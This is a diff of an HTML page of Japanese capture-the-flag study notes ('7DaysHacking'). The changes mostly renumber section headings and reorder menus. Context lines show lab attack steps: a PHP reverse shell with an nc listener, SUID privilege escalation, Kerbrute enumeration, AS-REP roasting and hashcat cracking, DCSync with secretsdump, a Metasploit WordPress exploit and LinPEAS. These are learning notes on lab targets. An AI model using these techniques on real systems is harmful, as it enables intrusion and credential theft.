@@ -62,22 +62,22 @@
 <li class="toctree-l1"><a class="reference internal" href="../GCP/GCP.html">1. GCPについて</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../GCP/IAM.html">2. IAM</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../GCP/API.html">3. Google Cloud APIs</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/GKE.html">4. GKE</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/Network.html">5. Network</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/Storage.html">6. ストレージ</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/CloudLogging.html">7. Cloud Logging</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/DB.html">8. データベースサービス</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/DataAnalytics.html">9. データ分析サービス</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/AI.html">10. AIサービス</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/GCE.html">11. GCE(Google Compute Engine)</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/Container.html">12. コンテナサービス</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/Serverless.html">13. サーバーレスアーキテクチャ</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/Network.html">4. Network</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/CICD.html">5. CICD</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/GCE.html">6. GCE(Google Compute Engine)</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/Container.html">7. コンテナサービス</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/Serverless.html">8. サーバーレスアーキテクチャ</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/GKE.html">9. GKE</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/APIGW.html">10. API Gateway</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/Storage.html">11. ストレージ</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/CloudLogging.html">12. Cloud Logging</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/DB.html">13. DB</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../GCP/Workflows.html">14. Workflows</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../GCP/CloudScheduler.html">15. Cloud Scheduler</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../GCP/Pub-Sub.html">16. Pub/Sub</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/Redis.html">17. Redis</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/ArtifactRegistry.html">18. ArtifactRegistry</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../GCP/Apigee.html">19. Apigee</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/DataAnalytics.html">17. データ分析サービス</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/AI.html">18. AIサービス</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../GCP/Redis.html">19. Redis</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../GCP/misc.html">20. その他</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">ITBasic:</span></p>
@@ -151,12 +151,12 @@
 <li class="toctree-l3"><a class="reference internal" href="#ftp">1.5.2. FTPの調査</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#httpd">1.5.3. HTTPDの調査</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#id16">1.5.4. リバースシェル</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id17">リバースシェルで攻撃</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id17">1.5.4.1. リバースシェルで攻撃</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#id18">1.5.5. 権限昇格</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#suid">SUID</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id19">SUIDでの権限昇格</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#suid">1.5.5.1. SUID</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id19">1.5.5.2. SUIDでの権限昇格</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#day5">1.5.6. Day5勉強したこと</a></li>
@@ -168,16 +168,16 @@
 <li class="toctree-l3"><a class="reference internal" href="#activedirectory">1.6.3. ActiveDirectoryとは</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#kerberos">1.6.4. Kerberos認証とは</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#as-rep-roasting">1.6.5. AS-REP Roasting攻撃</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id21">Kerbruteでユーザー調査</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id21">1.6.5.1. Kerbruteでユーザー調査</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#tgt">1.6.6. TGTの取得とハッシュからパスワードをクラッシュ</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#impackettgt">Impacketを利用したTGTの取得</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#hash">Hashのクラッシュ</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#impackettgt">1.6.6.1. Impacketを利用したTGTの取得</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#hash">1.6.6.2. Hashのクラッシュ</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#dcsync">1.6.7. DCSync攻撃</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#impacketdcsync">Impacketを利用したDCsync</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#impacketdcsync">1.6.7.1. Impacketを利用したDCsync</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#pass-the-hashadmin">1.6.8. Pass the HashでAdminをハック</a></li>
@@ -187,19 +187,19 @@
 <li class="toctree-l2"><a class="reference internal" href="#day7">1.7. Day7</a><ul>
 <li class="toctree-l3"><a class="reference internal" href="#id22">1.7.1. 偵察</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#smbclient">1.7.2. smbclientへの攻撃</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id23">ステガノグラフィ</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id23">1.7.2.1. ステガノグラフィ</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#wordpress">1.7.3. WordPressのアプリへの攻撃</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#id24">1.7.4. WordPressのサーバーへの攻撃</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id25">脆弱性の調査</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#metasploit">Metasploitを利用した攻撃</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id25">1.7.4.1. 脆弱性の調査</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#metasploit">1.7.4.2. Metasploitを利用した攻撃</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#id26">1.7.5. 権限昇格</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#linpeas">LinPEAS</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id27">LinPEASをターゲットへアップロード</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id28">LinPEASの実行</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#linpeas">1.7.5.1. LinPEAS</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id27">1.7.5.2. LinPEASをターゲットへアップロード</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id28">1.7.5.3. LinPEASの実行</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#id29">1.7.6. Day7勉強したこと</a></li>
@@ -776,7 +776,7 @@ PHPファイルがアップロードできるということで今回は<code cl
 <p><img alt="" src="../_images/7DayHacking_day5_5.png" />
 <a class="reference external" href="https://www.wallarm.com/jp/what/reverse-shell">リバースシェルとは？事例と防止策</a></p>
 <section id="id17">
-<h4>リバースシェルで攻撃<a class="headerlink" href="#id17" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.5.4.1. </span>リバースシェルで攻撃<a class="headerlink" href="#id17" title="この見出しへのパーマリンク">¶</a></h4>
 <p>Kaliにはpht-reverse-shell.phpが準備されているので、攻撃者のIPや待ち受けポートを書き換えた上で、先ほどのページからアップロードする。</p>
 <p>攻撃者側はポートを待ち受ける必要があるので、以下のncコマンドを実行した上で、ブラウザ上からリバースシェルのファイルを実行すると、サーバー側がのシェルが取れる</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">12345</span>
@@ -789,7 +789,7 @@ PHPファイルがアップロードできるということで今回は<code cl
 <section id="id18">
 <h3><span class="section-number">1.5.5. </span>権限昇格<a class="headerlink" href="#id18" title="この見出しへのパーマリンク">¶</a></h3>
 <section id="suid">
-<h4>SUID<a class="headerlink" href="#suid" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.5.5.1. </span>SUID<a class="headerlink" href="#suid" title="この見出しへのパーマリンク">¶</a></h4>
 <p>SUID(Set UserID)とは、実行ファイルに付与される特殊なパーミッションである。
 実行権限<code class="docutils literal notranslate"><span class="pre">s</span></code>がついている実行ファイルは、実行者のUIDに関係なくファイルの所有者での実行権限が利用される。
 例えばパスワード変更のコマンドは、rootでなければ実行できないので、SUIDの機能を用いて一般ユーザーでもパスワード変更ができるようになっている。</p>
@@ -798,7 +798,7 @@ PHPファイルがアップロードできるということで今回は<code cl
 どのように実行者の権限（rootなど）を取られてしまうかというと、実行プロセスがrootになった状態では子供プロセスもrootとなるためにrootのシェルを取られてしまう。</p>
 </section>
 <section id="id19">
-<h4>SUIDでの権限昇格<a class="headerlink" href="#id19" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.5.5.2. </span>SUIDでの権限昇格<a class="headerlink" href="#id19" title="この見出しへのパーマリンク">¶</a></h4>
 <p>まずは、SUIDが設定された実行ファイルを探す</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 </pre></div>
@@ -993,7 +993,7 @@ PORT     STATE SERVICE       VERSION
 </li>
 </ul>
 <section id="id21">
-<h4>Kerbruteでユーザー調査<a class="headerlink" href="#id21" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.6.5.1. </span>Kerbruteでユーザー調査<a class="headerlink" href="#id21" title="この見出しへのパーマリンク">¶</a></h4>
 <p>事前準備でkerbruteの実行はできているので、攻撃対象の設定をする。</p>
 <p>kali上の<code class="docutils literal notranslate"><span class="pre">/etc/hosts</span></code>にIPとドメインの名前解決の設定をしておく</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
@@ -1036,7 +1036,7 @@ wget<span class="w"> </span>https://raw.githubusercontent.com/Sq00ky/attacktive-
 <section id="tgt">
 <h3><span class="section-number">1.6.6. </span>TGTの取得とハッシュからパスワードをクラッシュ<a class="headerlink" href="#tgt" title="この見出しへのパーマリンク">¶</a></h3>
 <section id="impackettgt">
-<h4>Impacketを利用したTGTの取得<a class="headerlink" href="#impackettgt" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.6.6.1. </span>Impacketを利用したTGTの取得<a class="headerlink" href="#impackettgt" title="この見出しへのパーマリンク">¶</a></h4>
 <p>Impacketは、さまざまなプロトコルをプログラムから操作しやすくなるためのライブラリやツールの集まり。
 GetNPUser.pyを利用して、取得したユーザーを利用してTGTを取得してみる</p>
 <p>以下を実行してパスワードは未記入でEnter</p>
@@ -1050,7 +1050,7 @@ GetNPUser.pyを利用して、取得したユーザーを利用してTGTを取�
 <p>得られたHash値はhash.txtに書き込んでおく</p>
 </section>
 <section id="hash">
-<h4>Hashのクラッシュ<a class="headerlink" href="#hash" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.6.6.2. </span>Hashのクラッシュ<a class="headerlink" href="#hash" title="この見出しへのパーマリンク">¶</a></h4>
 <p>取得できたTGTのハッシュからhashcatを利用してhash解析をしてパスワードを取得。</p>
 <p>hashcatでは、解析したいハッシュ対象を指定するため、確認するとAS-REQは18200</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
@@ -1125,7 +1125,7 @@ backup@spookysec.local:backup2517860
 <p>DCSync攻撃とは、ドメインコントローラーのバックアップ権限を持っているユーザーを利用して、バックアップ時にパスワード情報を抜き取る。
 ActiveDirectoryでは、パスワード情報などを暗号化したNTLMハッシュとして保管されている。</p>
 <section id="impacketdcsync">
-<h4>Impacketを利用したDCsync<a class="headerlink" href="#impacketdcsync" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.6.7.1. </span>Impacketを利用したDCsync<a class="headerlink" href="#impacketdcsync" title="この見出しへのパーマリンク">¶</a></h4>
 <p>Impacketのツールを利用して、DCsyncを実行</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
 └─$<span class="w"> </span>./secretsdump.py<span class="w"> </span>-just-dc-ntlm<span class="w"> </span>backup@spookysec.local<span class="w"> </span>-outputfile<span class="w"> </span>spookysec
@@ -1199,7 +1199,7 @@ WordPressに対して、自書攻撃をしてアプリにログインをした�
 <section id="smbclient">
 <h3><span class="section-number">1.7.2. </span>smbclientへの攻撃<a class="headerlink" href="#smbclient" title="この見出しへのパーマリンク">¶</a></h3>
 <p>smbclinetを利用して共有フォルダを探索してみると、anonymousユーザーでログインできるBillySMBファイルを発見。その中のファイルを3つDLできる</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day7]
 └─$ smbclient -L \\\\blog.thm                    
 Password for [WORKGROUP\kali]:
 
@@ -1227,7 +1227,7 @@ getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (7.
 </pre></div>
 </div>
 <section id="id23">
-<h4>ステガノグラフィ<a class="headerlink" href="#id23" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.7.2.1. </span>ステガノグラフィ<a class="headerlink" href="#id23" title="この見出しへのパーマリンク">¶</a></h4>
 <p>テキスト・音声・画像ファイルなどに隠しテキストを埋め込むことができる技術。
 <code class="docutils literal notranslate"><span class="pre">steghide</span></code>というツールを利用すると隠しテキストの埋め込みや抽出が可能。</p>
 <p>今回はjpegに対して、抽出を実行してみるとrabbit_hole.txtが取得できる。
@@ -1253,7 +1253,7 @@ wpscanというコマンドを実行してユーザーを炙り出すと以下�
 <li><p>kwheel</p></li>
 <li><p>bjoel</p></li>
 </ul>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day7]
 └─$ wpscan --url http://blog.thm --enumerate u
 _______________________________________________________________
          __          _______   _____
@@ -1296,7 +1296,7 @@ _______________________________________________________________
 <section id="id24">
 <h3><span class="section-number">1.7.4. </span>WordPressのサーバーへの攻撃<a class="headerlink" href="#id24" title="この見出しへのパーマリンク">¶</a></h3>
 <section id="id25">
-<h4>脆弱性の調査<a class="headerlink" href="#id25" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.7.4.1. </span>脆弱性の調査<a class="headerlink" href="#id25" title="この見出しへのパーマリンク">¶</a></h4>
 <p>nmapの結果からWordPressのバージョンが古いことはわかっているので脆弱性をネットで調査すると2つ脆弱性があるらしい</p>
 <ul class="simple">
 <li><p>CVE-2019-8942</p></li>
@@ -1305,7 +1305,7 @@ _______________________________________________________________
 </ul>
 </section>
 <section id="metasploit">
-<h4>Metasploitを利用した攻撃<a class="headerlink" href="#metasploit" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.7.4.2. </span>Metasploitを利用した攻撃<a class="headerlink" href="#metasploit" title="この見出しへのパーマリンク">¶</a></h4>
 <p>Metasploitを利用して、CVE-2019-8942の脆弱性を突いてみる</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day7<span class="o">]</span>
 └─$<span class="w"> </span>msfconsole
@@ -1374,15 +1374,15 @@ Server<span class="w"> </span>username:<span class="w"> </span>www-data
 <h3><span class="section-number">1.7.5. </span>権限昇格<a class="headerlink" href="#id26" title="この見出しへのパーマリンク">¶</a></h3>
 <p>adminなどの強い権限を取得するために脆弱性を調査する。</p>
 <section id="linpeas">
-<h4>LinPEAS<a class="headerlink" href="#linpeas" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.7.5.1. </span>LinPEAS<a class="headerlink" href="#linpeas" title="この見出しへのパーマリンク">¶</a></h4>
 <p>ターゲットサーバーへの初期侵入が完了後、実行することで権限昇格できそうなミスを探すためのツール。</p>
 </section>
 <section id="id27">
-<h4>LinPEASをターゲットへアップロード<a class="headerlink" href="#id27" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.7.5.2. </span>LinPEASをターゲットへアップロード<a class="headerlink" href="#id27" title="この見出しへのパーマリンク">¶</a></h4>
 <p>取得方法はローカルマシーンでLinPEASをDLしておいて、ローカルでサーバーを立てる。その後進入済みのマシーンからローカルマシーンに対してDLするような処理で行う。</p>
 </section>
 <section id="id28">
-<h4>LinPEASの実行<a class="headerlink" href="#id28" title="この見出しへのパーマリンク">¶</a></h4>
+<h4><span class="section-number">1.7.5.3. </span>LinPEASの実行<a class="headerlink" href="#id28" title="この見出しへのパーマリンク">¶</a></h4>
 <p>実行すると実行権限に<code class="docutils literal notranslate"><span class="pre">s</span></code>がついているコマンドを発見。</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      ╔════════════════════════════════════╗
 ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                              
